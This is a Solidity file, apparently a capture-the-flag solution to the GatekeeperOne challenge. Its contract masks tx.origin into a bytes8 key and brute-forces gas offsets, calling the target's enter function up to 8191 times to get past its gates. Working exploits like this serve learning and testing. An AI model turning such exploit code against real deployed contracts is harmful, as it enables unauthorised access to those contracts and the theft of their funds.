// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";
import "./GatekeeperOne.sol";

contract AttackGatekeeperOne {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        bytes8 key = bytes8(uint64(tx.origin));
        key = key & 0x6d696b65_0000_FFFF;

        for (uint256 i = 0; i < 8191; i++) {
            (bool result, ) = victim.call{gas: 24000 + i}(
                abi.encodeWithSignature(("enter(bytes8)"), key)
            );
            if (result) {
                break;
            }
        }
    }
}
